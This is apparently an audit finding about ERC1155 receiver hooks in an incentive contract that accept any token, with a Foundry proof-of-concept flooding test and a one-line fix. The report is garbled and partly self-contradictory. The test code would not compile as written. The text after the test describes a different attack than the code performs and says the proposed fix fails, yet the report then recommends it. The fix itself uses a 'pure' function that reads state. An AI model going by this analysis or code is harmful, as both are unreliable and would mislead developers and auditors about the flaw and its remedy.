# Unrestricted ERC1155 Token Transfers

## Summary

## Vulnerability Detail
The onERC1155Received and onERC1155BatchReceived functions do not check the token ID or the sender. This means that anyone can send any ERC1155 token to the contract.An attacker could create a malicious ERC1155 contract that mints a large number of worthless tokens. They could then repeatedly call the safeTransferFrom function on their malicious contract, targeting the ERC1155 incentive contract. The incentive contract would be forced to accept and store these unwanted tokens.
```solidity 
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ERC1155Incentive} from "src/incentives/ERC1155Incentive.sol";
import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";

contract ERC1155IncentiveDoS is Test {
    ERC1155Incentive public incentive;
    ERC1155 public token;

    address alice = address(0x1111);
    uint256 tokenId = 1;

    function setUp() public {
        token = new ERC1155("");
        incentive = new ERC1155Incentive();
        incentive.initialize(
            abi.encode(
                ERC1155Incentive.InitPayload({
                    asset: token,
                    strategy: ERC1155Incentive.Strategy.POOL,
                    tokenId: tokenId,
                    limit: 100,
                    extraData: ""
                })
            )
        );
        token.setApprovalForAll(address(incentive), true);
    }

    function testDoS() public {
        vm.startPrank(alice);

        // Mint a large number of different tokens to the attacker
        uint256[] memory tokenIds = new uint256[](100);
        uint256[] memory amounts = new uint256[](100);
        for (uint256 i = 0; i < 100; i++) {
            tokenIds[i] = i + 10; // Use token IDs different from the incentive's tokenId
            amounts[i] = 1000000000000000000; // Mint a large amount of each token
        }
        token.mintBatch(alice, tokenIds, amounts, "");

        // Send the junk tokens to the incentive contract
        for (uint256 i = 0; i < 100; i++) {
            token.safeTransferFrom(alice, address(incentive), tokenIds[i], amounts[i], "");
        }

        vm.stopPrank();
    }
}

```
 Alice mints a large amount of the token with the correct tokenId (the same one used by the ERC1155Incentive contract) and sends it to the contract. This demonstrates that even though the suggested mitigation (require(tokenId == this.tokenId, "Invalid token ID");) is in place, Alice can still flood the contract with a large amount of the correct token, potentially leading to storage bloat and increased gas costs.

## Impact
Denial of Service: In extreme cases, the attacker could flood the contract with so many tokens that it becomes too expensive to interact with, effectively denying service to legitimate users.

## Recommendation
```solidity 

function onERC1155Received(address, address, uint256 tokenId, uint256, bytes calldata)
    external
    pure
    override
    returns (bytes4)
{
    // Only accept the intended token ID
+ require(tokenId == this.tokenId, "Invalid token ID"); 
    return this.onERC1155Received.selector;
}
